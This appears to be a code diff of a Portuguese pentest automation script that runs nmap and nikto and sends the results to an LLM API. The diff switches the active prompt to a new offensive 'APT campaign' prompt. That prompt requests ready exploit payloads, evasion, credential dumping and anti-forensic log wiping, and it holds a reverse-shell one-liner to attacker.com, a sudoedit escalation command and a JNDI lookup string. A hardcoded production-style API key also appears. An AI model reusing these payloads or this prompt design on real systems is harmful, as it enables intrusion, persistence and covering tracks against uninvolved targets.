@@ -39,7 +39,6 @@ import subprocess
 import json
 import re
 import socket
-import sqlite3  # Biblioteca nativa para SQLite
 from datetime import datetime
 import requests
 from rich.console import Console
@@ -50,112 +49,170 @@ API_ENDPOINT = "http://localhost:5000/analyze"
 API_KEY = "sk_prod_1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
 
 ### Você pode escolher qual será contexto da análise: Proteção ou Exploração ###
-
-### Feito com DeepSeek-R1
-#CONTEXT_MESSAGE_Misto="Objetivo: Fornecer uma análise técnica aprofundada e correlacionada dos resultados de PenTest, combinando identificação de vulnerabilidades, avaliação de riscos, sugestões de exploração e recomendações de mitigação. A análise deve considerar dados de uma única ferramenta por relatório, garantindo precisão e contextualização adequada.\n\nPonto importante de atenção:\n- Você só receberá relatórios de 1 ferramenta por vez.\n- Identifique qual ferramenta gerou o relatório (ex: Nmap, Nikto, Amass, etc.).\n- Processe apenas as informações da ferramenta que enviou o relatório.\n- Formato de resposta: PT-BR (Português do Brasil).\n- Estrutura da resposta organizada em seções (por ferramenta ou categoria de risco).\n- Destaque riscos críticos e CVEs.\n- Use listas para PoCs (Proofs of Concept) e recomendações.\n- Conclusão com resumo executivo (impacto geral e ações prioritárias).\n\nInstruções detalhadas:\n1. Análise por ferramenta:\n   - Descreva os resultados do relatório, identificando a ferramenta utilizada (ex: Nmap para portas abertas, Nikto para vulnerabilidades web).\n   - Contextualize o papel da ferramenta no escopo do PenTest (ex: SSLyze para avaliação SSL/TLS).\n2. Classificação de riscos:\n   - Classifique vulnerabilidades por gravidade (baixa, média, alta), usando matriz de risco (impacto x probabilidade).\n   - Priorize CVEs conhecidos e vulnerabilidades com exploração pública.\n3. Vetores de exploração e PoCs:\n   - Para cada vulnerabilidade, sugira vetores de exploração (ex: uso de Metasploit para serviços desatualizados).\n   - Inclua ideias de PoCs práticos (ex: comandos curl para testar XSS, scripts para verificar SQLi).\n4. Recomendações técnicas:\n   - Liste ações específicas para mitigação (ex: atualizar serviços, corrigir configurações).\n   - Explique como cada medida neutraliza o vetor de ataque associado.\n5. Validação de falsos positivos:\n   - Indique métodos para confirmar resultados (ex: testes manuais, uso de Nessus ou Burp Suite).\n6. Avaliação de impacto:\n   - Descreva cenários de exploração realistas (ex: acesso não autorizado via subdomínio esquecido).\n   - Relacione vulnerabilidades a impactos operacionais (ex: vazamento de dados, interrupção de serviços).\n7. Terminologia técnica:\n   - Use termos como exploit, payload, hardening e CVE para manter precisão.\n\nExemplo de estrutura esperada na resposta:\n- Ferramenta analisada: [Nome da ferramenta]\n- Riscos identificados:\n  - [Alta gravidade] Vulnerabilidade X (CVE-XXXX-XXXX): Descrição técnica.\n  - Vetor de exploração: Descrição de como um atacante poderia explorar a falha.\n  - PoC sugerido: Comando ou script para validação.\n- Recomendações:\n  - Aplicar patch Y na versão do serviço Z.\n  - Configurar firewall para bloquear porta exposta.\n- Falsos positivos:\n  - Vulnerabilidade A requer validação manual via [método].\n\nConclusão (Resumo executivo):\n- Impacto geral: Resumo dos riscos críticos e seu potencial impacto no ambiente.\n- Ações prioritárias: Lista concisa das correções mais urgentes (ex: corrigir CVE crítico, remover subdomínio mal configurado).\n\nObservação final:\n- Mantenha a resposta em PT-BR, com clareza técnica e organização lógica.\n- Priorize a acionabilidade: cada item deve permitir que a equipe de segurança execute correções ou validações."
-
-##@ Feito com ChatGTP o1
-CONTEXT_MESSAGE_Misto=( "Prompt para Análise Técnica Aprofundada:" "" "Objetivo:" "Fornecer uma análise técnica, aprofundada e correlacionada dos resultados dos scans de PenTest, identificando, classificando e interpretando os riscos e vulnerabilidades detectados no alvo, bem como explorando possíveis vetores de ataque e proofs-of-concept (PoCs) quando aplicável. Os dados foram coletados pelas ferramentas Nmap, Nikto, Amass, theHarvester, sublist3r, dnsrecon e SSLyze, podendo incluir informações sobre portas abertas, detecção de serviços, enumeração de subdomínios, vulnerabilidades conhecidas, configurações de SSL/TLS, banners e informações DNS." "" "Ponto importante de atenção:" "- Você só irá receber relatórios de 1 ferramenta por vez." "- Identifique a ferramenta que esteja enviando o relatório para ser analisado." "- Processe apenas informações da ferramenta da qual você recebeu o relatório." "- Formato de linguagem da Resposta Esperado: PT-BR (Portugues do Brasil)." "- Estruturado em seções (por ferramenta ou categoria de risco)." "- Destaque em negrito riscos críticos e CVEs." "- Use listas para PoCs e recomendações." "- Conclusão com resumo executivo (impacto geral e ações prioritárias)." "" "Instruções de Análise (combinando aspectos de detecção, mitigação e exploração):" "1) Organização e Detalhamento:" " a) Analise detidamente o conteúdo do relatório recebido, classificando as informações por ferramenta (Nmap, Nikto, Amass, theHarvester, sublist3r, dnsrecon, SSLyze) ou por categoria de risco (baixa, média, alta)." " b) Destaque informações críticas e referências a vulnerabilidades conhecidas (CVE) ou boas práticas de segurança." "" "2) Identificação e Classificação de Riscos:" " a) Classifique cada vulnerabilidade ou achado em termos de gravidade (baixa, média, alta) com base em impacto e probabilidade." " b) Sempre que possível, inclua referências a CVEs e evidências técnicas para embasar a análise." "" "3) Exploração e Vetores de Ataque:" " a) Para cada vulnerabilidade, descreva possíveis vetores de exploração, incluindo exemplos de uso de ferramentas como Metasploit ou scripts personalizados." " b) Forneça ideias de proof-of-concept (PoC) demonstrando como validar ou explorar a falha (por exemplo, scripts em Python, uso de Burp Suite para interceptar e manipular requisições HTTP, técnicas de brute force, fuzzing etc.)." "" "4) Recomendações de Mitigação:" " a) Para cada falha, apresente recomendações técnicas específicas de correção ou mitigação (aplicar patches, hardening de sistemas, substituir protocolos obsoletos, renovar certificados etc.)." " b) Explique de que forma cada medida recomendada bloqueia ou dificulta o vetor de ataque apontado." "" "5) Falsos Positivos e Validação:" " a) Considere possíveis falsos positivos, indicando métodos de validação (verificações manuais, uso de múltiplas ferramentas, testes adicionais em ambiente controlado)." "" "6) Avaliação de Impacto:" " a) Descreva cenários de como as vulnerabilidades podem ser exploradas e o impacto resultante no ambiente." " b) Inclua exemplos de ataques reais ou hipotéticos (subdomínios esquecidos que podem permitir phishing, portas abertas que possibilitam movimentação lateral etc.)." "" "7) Terminologia e Linguagem:" " a) Utilize terminologia técnica de segurança da informação e de PenTest (enumerar, hardening, payload, exploit, post-exploitation etc.)." " b) Apresente toda a análise em Português do Brasil." "" "8) Conclusão e Resumo Executivo:" " a) Forneça um breve resumo dos principais riscos e vulnerabilidades encontradas." " b) Destaque as ações prioritárias a serem tomadas, considerando o impacto geral no ambiente." "" "Observação final:" "Você está recebendo dados levantados pelas ferramentas Nmap, Nikto, Amass, theHarvester, sublist3r, dnsrecon e SSLyze. Toda a análise gerada deve ser apresentada em Português do Brasil, estruturando as seções de forma clara e enfatizando riscos críticos e referências a CVEs em negrito, além de recomendar medidas de correção ou mitigação para cada item identificado." )
-
-CONTEXT_MESSAGE_Protecao = (
-    "Objetivo: Fornecer uma análise técnica, aprofundada e correlacionada dos resultados dos scans de PenTest, "
-    "identificando, classificando e interpretando os riscos e vulnerabilidades detectados no alvo. "
-    "Os resultados foram coletados por diversas ferramentas (Nmap, Nikto, Amass, theHarvester, sublist3r, dnsrecon e SSLyze) e podem conter dados sobre "
-    "port scanning, detecção de serviços, enumeração de subdomínios, vulnerabilidades conhecidas e informações DNS. \n\n"
+CONTEXT_MESSAGE_Misto = (
+    "Observação: Fornecer uma análise técnica independente para cada ferramenta de scan, "
+    "tratando cada envio como um contexto completamente novo. "
+    "Ignore quaisquer dados ou análises anteriores - cada requisição deve ser processada isoladamente.\n\n"
+    "DIRETRIZES PARA ANÁLISE TÁTICA COMBINADA (MITRE ATT&CK + OWASP Top 10):\n"
+    "Cada análise deve integrar perspectivas defensivas e ofensivas baseadas exclusivamente nos dados da ferramenta atual.\n\n"
     
-    "Instruções:\n"
-    "1. Analise detalhadamente os resultados apresentados, organizando-os por ferramenta e destacando informações críticas. Considere o papel de cada ferramenta:\n"
-    "   - Nmap: Identificação de portas abertas, serviços expostos e sistemas operacionais.\n"
-    "   - Nikto: Detecção de vulnerabilidades em servidores web, como configurações inseguras e arquivos sensíveis expostos.\n"
-    "   - Amass/theHarvester: Enumeração de subdomínios e coleta de informações públicas (OSINT).\n"
-    "   - Sublist3r/dnsrecon: Descoberta de registros DNS e subdomínios esquecidos ou mal configurados.\n"
-    "   - SSLyze: Análise de configurações de SSL/TLS, identificando problemas como certificados expirados ou protocolos inseguros.\n"
-    "2. Identifique e classifique as vulnerabilidades e riscos encontrados, determinando a gravidade de cada item (baixa, média, alta) com base em uma matriz de risco (impacto x probabilidade). Sempre que possível, referencie CVEs ou boas práticas de segurança.\n"
-    "3. Forneça recomendações técnicas específicas para a mitigação ou correção de cada vulnerabilidade, incluindo sugestões de controles e medidas corretivas. Exemplos:\n"
-    "   - Serviços desatualizados: Aplicar patches ou substituir por alternativas seguras.\n"
-    "   - Configurações inseguras: Implementar hardening de sistemas e servidores.\n"
-    "   - Certificados SSL/TLS: Renovar certificados expirados e desativar protocolos obsoletos (ex.: TLS 1.0).\n"
-    "4. Considere possíveis falsos positivos e indique métodos para sua validação, como verificações manuais, uso de múltiplas ferramentas ou testes adicionais em ambiente controlado.\n"
-    "5. A análise deve conter uma avaliação de impacto, detalhando como as vulnerabilidades podem ser exploradas e afetar o ambiente. Inclua cenários hipotéticos ou exemplos reais de ataques relacionados. Exemplo:\n"
-    "   - Portas abertas em firewalls podem permitir acesso não autorizado a serviços internos.\n"
-    "   - Subdomínios esquecidos podem ser usados para phishing ou ataques de força bruta.\n"
-    "6. Utilize terminologia técnica de PenTest e de segurança da informação, como 'CVE', 'hardening', 'enumeração' e 'falsos positivos'.\n\n"
+    "REQUISITOS TÉCNICOS:\n"
+    "1. MAPEAMENTO DUPLO: Para cada vulnerabilidade:\n"
+    "   a) [Proteção] CWE-ID + CIS Controls correspondente\n"
+    "   b) [Ataque] TTP-ID MITRE ATT&CK + ExploitDB Reference\n"
+    "2. ANÁLISE ESTRATIFICADA:\n"
+    "   - Camada de Rede: CVSS v3.1 + Impacto em PCI-DSS/HIPAA\n"
+    "   - Camada Aplicação: OWASP Risk Rating + Impacto em GDPR\n"
+    "3. DETALHAMENTO OPERACIONAL:\n"
+    "   - Comandos EXATOS para validação (ex: curl, nmap scripts)\n"
+    "   - Configurações SPECÍFICAS para hardening\n"
+    "   - Payloads PRONTOS para exploração (ex: reverse shells)\n\n"
     
-    "Você está recebendo dados levantados pelos softwares: Nmap, Nikto, Amass, theHarvester, sublist3r, dnsrecon e SSLyze. "
-    "Observação importante: Apresente toda a sua análise em Português do Brasil (PT-BR). "
-    "Observação importante: Resultados sempre em Português do Brasil (PT-BR)."
+    "FLUXO DE ANÁLISE POR CAMADA (POR FERRAMENTA):\n"
+    "1. IDENTIFICAÇÃO:\n"
+    "   - [Tática] Mapear para Phase Matrix (Recon, Exploitation, etc)\n"
+    "   - [Técnica] Associar à matriz MITRE (ex: T1595.003 para scanning)\n"
+    "   - [Procedimento] Listar procedimentos do adversário (Ex: Brute Force via Nmap scripts)\n\n"
+    
+    "2. PROFUNDIDADE TÉCNICA:\n"
+    "   a) Para defensores:\n"
+    "      - WAF Rules (ModSecurity snippet)\n"
+    "      - SIEM Detection Rules (Sigma format)\n"
+    "      - Patch Management Steps\n"
+    "   b) Para atacantes:\n"
+    "      - Exploit Crafting (Python PoC skeleton)\n"
+    "      - Privilege Escalation Paths\n"
+    "      - Pivoting Opportunities\n\n"
+    
+    "MODELO DE SAÍDA AVANÇADO:\n"
+    "=================================\n"
+    "[NMAP] Port 445/tcp - SMB v3.1.1 (Windows 10 19042)\n"
+    "[PROTEÇÃO] CWE-200: Exposure Sensitive Info\n"
+    "   - CIS Control 9: Limit Network Ports/Protocols\n"
+    "   - Hardening: `Set-SmbServerConfiguration -EncryptData $true`\n"
+    "[ATAQUE] T1570: Lateral Tool Transfer\n"
+    "   - Exploit: EternalBlue (MS17-010) via metasploit/auxiliary/scanner/smb/smb_ms17_010\n"
+    "   - Post-Exploit: `invoke-SMBExec -Target IP -Command 'net group \"Domain Admins\" /domain'`\n"
+    "[COMPLIANCE] Violates PCI-DSS Req 1.2.1: Standard Firewall Configurations\n"
+    "=================================\n\n"
+    
+    "ELEMENTOS OBRIGATÓRIOS:\n"
+    "- Referências CWE/MITRE/OWASP\n"
+    "- Comandos executáveis em Linux/Windows\n"
+    "- Impacto regulatório (GDPR, LGPD, PCI-DSS)\n"
+    "- Validação de falsos positivos via 3 métodos distintos"
 )
 
-CONTEXT_MESSAGE_Exploracao = (
-    "Objetivo: Fornecer uma análise técnica, aprofundada e orientada para a exploração das vulnerabilidades detectadas pelo SCAN, "
-    "identificando, classificando e interpretando os riscos e falhas de segurança encontrados no alvo, e sugerindo vetores de exploração e proof-of-concept quando aplicável. "
-    "Os dados foram coletados por diversas ferramentas (Nmap, Nikto, Amass, theHarvester, sublist3r, dnsrecon e SSLyze) e podem incluir informações sobre "
-    "port scanning, detecção de serviços, enumeração de subdomínios, vulnerabilidades conhecidas, banners e informações DNS.\n\n"
+CONTEXT_MESSAGE_Protecao = (
+    "DIRETRIZES PARA HARDENING TÁTICO (NIST SP 800-53 + CIS CRITICAL SECURITY CONTROLS):\n"
+    "Cada análise deve produzir um plano de remediação prioritário com métricas mensuráveis.\n\n"
+    "Cada relatório deve ser processado como uma unidade independente - não há compartilhamento de contexto entre ferramentas.\n\n"
     
-    "Instruções:\n"
-    "1. Analise detalhadamente os resultados apresentados, organizando-os por ferramenta e destacando as informações críticas para a exploração das falhas. Considere o papel de cada ferramenta:\n"
-    "   - Nmap: Identificação de portas abertas e serviços expostos.\n"
-    "   - Nikto: Detecção de vulnerabilidades em servidores web.\n"
-    "   - Amass/theHarvester: Enumeração de subdomínios e informações públicas.\n"
-    "   - SSLyze: Análise de configurações de SSL/TLS.\n"
-    "2. Identifique e classifique as vulnerabilidades e riscos encontrados, determinando a gravidade de cada item (baixa, média, alta) com base em uma matriz de risco (impacto x probabilidade). Sempre que possível, referencie CVEs e evidências técnicas.\n"
-    "3. Para cada vulnerabilidade, forneça sugestões de vetores de exploração, descrevendo como um atacante poderia utilizar a falha para comprometer o alvo. Exemplos:\n"
-    "   - Serviços desatualizados: Uso de exploits públicos via Metasploit.\n"
-    "   - Subdomínios esquecidos: Brute force ou fuzzing para encontrar endpoints vulneráveis.\n"
-    "4. Inclua ideias de proof-of-concept, como scripts ou comandos simples para validar a vulnerabilidade. Exemplo:\n"
-    "   - Script Python para testar injeção SQL.\n"
-    "   - Uso do Burp Suite para interceptar e manipular requisições HTTP.\n"
-    "5. Apresente recomendações técnicas específicas para a mitigação ou correção das vulnerabilidades, sugerindo controles e medidas corretivas adequadas. Explique como cada controle bloquearia o vetor de ataque sugerido.\n"
-    "6. Considere a possibilidade de falsos positivos, indicando métodos para sua validação, como verificações manuais ou uso de múltiplas ferramentas.\n"
-    "7. A análise deve incluir uma avaliação do impacto, detalhando as consequências de uma exploração bem-sucedida para o ambiente. Inclua cenários hipotéticos ou exemplos reais de ataques relacionados.\n"
-    "8. Utilize terminologia técnica avançada de PenTest e de segurança da informação, como 'payload', 'exploit' e 'post-exploitation'.\n\n"
+    "COMPONENTES ESSENCIAIS:\n"
+    "1. CLASSIFICAÇÃO DE RISCO:\n"
+    "   - Probabilidade: Modelo FAIR (Frequência, Tempo de Exposição)\n"
+    "   - Impacto: Modelo DREAD (Damage, Reproducibility, etc)\n"
+    "2. PLANO DE AÇÃO:\n"
+    "   - Prioridade 1 (Crítico): Remediar em 24h\n"
+    "   - Prioridade 2 (Alto): Remediar em 72h\n"
+    "   - Prioridade 3 (Médio): Remediar em 14 dias\n"
+    "3. AUTOMAÇÃO:\n"
+    "   - Ansible Playbooks para correções\n"
+    "   - Terraform scripts para ajustes de infra\n"
+    "   - PowerShell DSC para Windows hardening\n\n"
     
-    "Você está recebendo dados levantados pelos softwares: Nmap, Nikto, Amass, theHarvester, sublist3r, dnsrecon e SSLyze. "
-    "Observação importante: Apresente toda a sua análise em Português do Brasil (PT-BR). "
-    "Observação importante: Resultados sempre em Português do Brasil (PT-BR)."
+    "SAÍDA DETALHADA (EXEMPLO):\n"
+    "=================================\n"
+    "[CVE-2023-1234] Apache Log4j 2.0 < 2.17.0\n"
+    "Risk Score: 9.8 CRITICAL (CVSS v3.1)\n"
+    "Affected Assets: 10 servers (tag: 'web-prod')\n"
+    "Remediation:\n"
+    "1. Patch: `ansible-galaxy install apache_log4j2 --version 2.17.1`\n"
+    "2. Workaround: Set JVM option `-Dlog4j2.formatMsgNoLookups=true`\n"
+    "3. Detection: Sigma rule 'log4j_jndi_detection'\n"
+    "Validation:\n"
+    " - `curl -X POST ${jndi:ldap://test}` → Blocked by WAF\n"
+    " - Auditd logs show prevented exploitation attempts\n"
+    "Compliance: Fails ISO 27001 A.12.6.1 (Technical Vulnerability Management)\n"
+    "=================================\n\n"
+    
+    "ARTEFATOS OBRIGATÓRIOS:\n"
+    "- Matriz de risco quantitativa\n"
+    "- Playbooks de automação executáveis\n"
+    "- Métricas de eficácia pós-remediação\n"
+    "- Relatório de conformidade regulatória"
+)
+
+CONTEXT_Exploracao = (
+    "DIRETRIZES PARA OPERAÇÃO OFENSIVA (CYBER KILL CHAIN + PENETRATION TESTING EXECUTION STANDARD):\n"
+    "Cada análise deve simular uma campanha APT usando exclusivamente os dados do scanner atual.\n\n"
+    "Cada conjunto de dados deve ser tratado como um cenário autônomo para exploração - sem memória entre requisições.\n\n"
+    
+    "COMPONENTES DE ATAQUE:\n"
+    "1. TÁTICAS AVANÇADAS:\n"
+    "   - Initial Access: Phishing, Exploit Public Apps\n"
+    "   - Execution: Command-Line Interfaces, API Abuse\n"
+    "   - Persistence: Cron Jobs, Registry Modifications\n"
+    "2. TÉCNICAS DE EVASÃO:\n"
+    "   - Obfuscation: XOR Encryption, Packers\n"
+    "   - Living-off-the-Land: LOLBAS/Win32 Abuse\n"
+    "3. POST-EXPLOITAÇÃO:\n"
+    "   - Credential Dumping (Mimikatz, LaZagne)\n"
+    "   - Lateral Movement (Pass-the-Hash, RDP Hijacking)\n\n"
+    
+    "MODELO DE OPERAÇÃO OFENSIVA:\n"
+    "=================================\n"
+    "[PHASE 1] Initial Compromise via SSH (Port 22/tcp)\n"
+    "Exploit: CVE-2021-41617 (OpenSSH 8.7 < 8.9)\n"
+    "Payload: `ssh -oPubkeyAcceptedKeyTypes=+ssh-rsa user@target 'mkfifo /tmp/f;sh -i < /tmp/f 2>&1 | openssl s_client -quiet -connect attacker.com:443 > /tmp/f; rm /tmp/f'`\n"
+    "[PHASE 2] Privilege Escalation\n"
+    "Technique: Sudoers misconfig (CVE-2023-22809)\n"
+    "Command: `sudoedit -s /\\\' `perl -e 'exec sh'`\n"
+    "[PHASE 3] Pivoting\n"
+    "Method: SSH Dynamic Port Forwarding\n"
+    "Command: `ssh -D 1080 -N -f user@compromised_host`\n"
+    "=================================\n\n"
+    
+    "ELEMENTOS CHAVE:\n"
+    "- Chain de exploração completo (Initial Access → Data Exfil)\n"
+    "- Técnicas fileless onde aplicável\n"
+    "- Mapas de calor de IoCs (Indicators of Compromise)\n"
+    "- Táticas de contra-forense (log wiping, timestomping)"
 )
 
 RESULTS_FILE = "results.json"
 NETWORK_DEVICES_FILE = "network_devices.txt"
 
-DB_FILE = "scan_results.db"  # Nome do arquivo local do banco SQLite
-
 console = Console()
 
-# ==================== FUNÇÕES DE BANCO DE DADOS ====================
+def save_to_json(timestamp, target, combined_output, analyses):
+    """
+    Insere um novo registro no arquivo JSON (results.json).
+    Se o arquivo não existir, cria um array; caso exista, carrega e adiciona ao final.
+    """
+    record = {
+        "timestamp": timestamp,
+        "target": target,
+        "combined_output": combined_output,
+        "analysis": analyses
+    }
 
-def init_db():
-    """
-    Cria o arquivo de banco de dados (scan_results.db) e a tabela scan_results (caso não existam).
-    """
-    conn = sqlite3.connect(DB_FILE)
-    cur = conn.cursor()
-    cur.execute(
-        """CREATE TABLE IF NOT EXISTS scan_results (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            timestamp TEXT NOT NULL,
-            target TEXT,
-            combined_output TEXT,
-            analysis TEXT
-        )"""
-    )
-    conn.commit()
-    conn.close()
+    # Carrega registros existentes (se houver)
+    try:
+        if os.path.exists(RESULTS_FILE):
+            with open(RESULTS_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+                if not isinstance(data, list):
+                    data = [data]
+        else:
+            data = []
+    except Exception:
+        data = []
 
-def save_to_database(timestamp, target, combined_output, analyses):
-    """
-    Insere um novo registro na tabela scan_results com todas as análises.
-    - analyses: dicionário com todas as análises das ferramentas
-    """
-    conn = sqlite3.connect(DB_FILE)
-    cur = conn.cursor()
-    cur.execute(
-        """INSERT INTO scan_results (timestamp, target, combined_output, analysis)
-           VALUES (?, ?, ?, ?)""",
-        (timestamp, target, combined_output, json.dumps(analyses, ensure_ascii=False))
-    )  # <-- Este parêntese estava faltando
-    conn.commit()
-    conn.close()
+    # Adiciona novo registro e salva de volta
+    data.append(record)
+    with open(RESULTS_FILE, "w", encoding="utf-8") as f:
+        json.dump(data, f, ensure_ascii=False, indent=4)
 
 # ==================== FUNÇÕES AUXILIARES ====================
 
@@ -207,30 +264,6 @@ def run_nmap_scan(target):
             "--traceroute",
             "--version-intensity", "9",
             "--script", "vuln,exploit,default,safe,vulners,vulscan/vulscan.nse",
-            "--script-args", "vulscanshowall=1,vulscanoutput=details",
-            normalized_target
-        ]
-    ),
-    (
-        "Comprehensive_Scan",
-        [
-            "nmap",
-            "-sS",
-            "-sU",
-            "-T4",
-            "-A",
-            "-v",
-            "-PE",
-            "-PP",
-            "-PA3389",
-            "-PU40125",
-            "-PY",
-            "-g", "53",
-            "--reason",
-            "--version-intensity", "9",
-            "--min-rate", "500",
-            "--max-retries", "2",
-            "--script", "default,discovery,safe,vulners,vulscan/vulscan.nse",
             "--script-args", "vulscanshowall=1,vulscanoutput=details",
             normalized_target
         ]
@@ -315,14 +348,39 @@ def get_server_ip(target):
         return None
 
 def run_nikto_scan(target):
-    """Executa Nikto (host + tuning 9) e retorna a saída."""
-    log_message(f"Iniciando Nikto para {target}")
+    """
+    Executa Nikto para o alvo especificado, sem salvar localmente.
+    Retorna apenas a saída (stdout) ou mensagem de erro.
+    """
+    # Normaliza o alvo
+    normalized = normalize_target(target)
+    log_message(f"Iniciando Nikto para {normalized}")
+
+    # Comando Nikto sem salvamento local
+    cmd = [
+        "nikto",
+        "-h", normalized,
+        "-Tuning", "12345678",   # todos os testes possíveis
+        "-Plugins", "ALL",       # executa todos os plugins
+        "-timeout", "30"         # timeout 30s para respostas lentas
+    ]
+
+    # Adiciona SSL se especificado porta 443 ou esquema HTTPS
+    if ":" in normalized and normalized.endswith(":443"):
+        cmd.insert(cmd.index("-h") + 2, "-ssl")
+
     try:
-        cmd = ["nikto", "-host", f"{target}", "-Tuning", "9"]
-        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
+        proc = subprocess.run(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            check=True
+        )
         return proc.stdout
+
     except subprocess.CalledProcessError as e:
-        error = f"Erro no Nikto: {e.stderr}"
+        error = f"Erro no Nikto: {e.stderr.strip()}"
         log_message(error)
         return error
 
@@ -526,7 +584,7 @@ def send_to_deepseek(scan_data):
     """
     payload = {
         "scan_data": scan_data,
-        "context": CONTEXT_MESSAGE_Misto
+        "context": CONTEXT_Exploracao
     }
     headers = {"X-API-Key": API_KEY}
     try:
@@ -666,110 +724,71 @@ def save_result(result_data):
     """
     Salva os resultados:
       1) Em um arquivo JSON (results.json).
-      2) No banco de dados SQLite (scan_results.db).
-      3) Em um arquivo HTML com o nome do alvo.
+      2) Em um arquivo HTML com o nome do alvo.
     """
-    # [Restante do código anterior mantido...]
-    
-    # Salva no banco de dados
+    # Salva em JSON local
     try:
         timestamp = datetime.now().isoformat()
         target = result_data.get("target", "N/A")
         combined_output = result_data.get("combined_output", "N/A")
-        
-        # Coleta todas as análises das ferramentas
         analyses = {
             tool: result_data.get(f"{tool}_analysis")
-            for tool in ["nmap", "nmap_ip", "nikto", "amass", 
-                        "theharvester", "sublist3r", "dnsrecon", "sslyze"]
+            for tool in [
+                "nmap", "nmap_ip", "nikto", "amass",
+                "theharvester", "sublist3r", "dnsrecon", "sslyze"
+            ]
         }
-        
-        save_to_database(timestamp, target, combined_output, analyses)
-        console.print("[+] Resultados gravados no banco de dados.", style="bold green")
+        save_to_json(timestamp, target, combined_output, analyses)
+        console.print(f"[+] Resultados gravados em '{RESULTS_FILE}'.", style="bold green")
     except Exception as e:
-        console.print(f"[-] Erro ao salvar no banco de dados: {e}", style="bold red")
+        console.print(f"[-] Erro ao salvar em JSON: {e}", style="bold red")
 
     # Salva relatório HTML
     try:
         target = result_data.get("target", "unknown_target")
         sanitized_target = re.sub(r'[^a-zA-Z0-9\-_]', '_', target)
         html_filename = f"{sanitized_target}.html"
-        
+
         # Constrói conteúdo HTML com análises detalhadas
         html_content = f"""<html>
-            <head>
-                <meta charset='utf-8'>
-                <title>Relatório de Scan - {target}</title>
-                <style>
-                    .analysis {{ margin-bottom: 2em; border: 1px solid #ddd; padding: 1em; }}
-                    .tool-name {{ color: #2c3e50; font-weight: bold; }}
-                    pre {{ white-space: pre-wrap; word-wrap: break-word; }}
-                </style>
-            </head>
-            <body>
-                <h1>Relatório de Scan para {target}</h1>
-                <h2>Resultados Combinados</h2>
-                <pre>{combined_output}</pre>
-                
-                <h2>Análises da API</h2>"""
-        
+    <head>
+        <meta charset='utf-8'>
+        <title>Relatório de Scan - {target}</title>
+        <style>
+            .analysis {{ margin-bottom: 2em; border: 1px solid #ddd; padding: 1em; }}
+            .tool-name {{ color: #2c3e50; font-weight: bold; }}
+            pre {{ white-space: pre-wrap; word-wrap: break-word; }}
+        </style>
+    </head>
+    <body>
+        <h1>Relatório de Scan para {target}</h1>
+        <h2>Resultados Combinados</h2>
+        <pre>{combined_output}</pre>
+
+        <h2>Análises da API</h2>"""
+
         # Adiciona cada análise ao HTML
         for tool, analysis in analyses.items():
             if analysis:
                 html_content += f"""
-                <div class="analysis">
-                    <div class="tool-name">{tool.upper()}</div>
-                    <pre>{json.dumps(analysis, indent=4, ensure_ascii=False)}</pre>
-                </div>"""
-        
-        html_content += "</body></html>"
-        
+        <div class="analysis">
+            <div class="tool-name">{tool.upper()}</div>
+            <pre>{json.dumps(analysis, indent=4, ensure_ascii=False)}</pre>
+        </div>"""
+
+        html_content += """
+    </body>
+</html>"""
+
         with open(html_filename, "w", encoding="utf-8") as f:
             f.write(html_content)
         console.print(f"[+] Relatório HTML salvo como '{html_filename}'", style="bold green")
     except Exception as e:
         console.print(f"[-] Erro ao gerar relatório HTML: {e}", style="bold red")
 
-def view_results():
-    """Exibe os resultados salvos no arquivo JSON."""
-    if not os.path.exists(RESULTS_FILE):
-        console.print("[-] Nenhum resultado salvo encontrado.", style="bold red")
-        return
-    try:
-        with open(RESULTS_FILE, "r", encoding="utf-8") as f:
-            results = json.load(f)
-        console.print("\n=== Resultados Salvos ===", style="bold blue")
-        console.print(json.dumps(results, indent=4, ensure_ascii=False))
-    except Exception as e:
-        console.print(f"[-] Erro ao ler resultados: {e}", style="bold red")
-
-### REMOVER ###
-def export_results_to_html():
-    """Exporta os resultados salvos para um arquivo HTML (results.html)."""
-    if not os.path.exists(RESULTS_FILE):
-        console.print("[-] Nenhum resultado salvo encontrado para exportação.", style="bold red")
-        return
-    try:
-        with open(RESULTS_FILE, "r", encoding="utf-8") as f:
-            results = json.load(f)
-        html_content = (
-            "<html><head><meta charset='utf-8'><title>Resultados do PenTest</title></head>"
-            "<body><h1>Resultados do PenTest</h1><pre>"
-            + json.dumps(results, indent=4, ensure_ascii=False) +
-            "</pre></body></html>"
-        )
-        html_file = "results.html"
-        with open(html_file, "w", encoding="utf-8") as f:
-            f.write(html_content)
-        console.print(f"[+] Resultados exportados para '{html_file}'", style="bold green")
-    except Exception as e:
-        console.print(f"[-] Erro ao exportar resultados para HTML: {e}", style="bold red")
-### REMOVER ###
-
 # ==================== MENU PRINCIPAL ====================
 
 def main_menu():
-    init_db()
 
     while True:
         console.print("\n==== Menu de PenTest ====", style="bold blue")
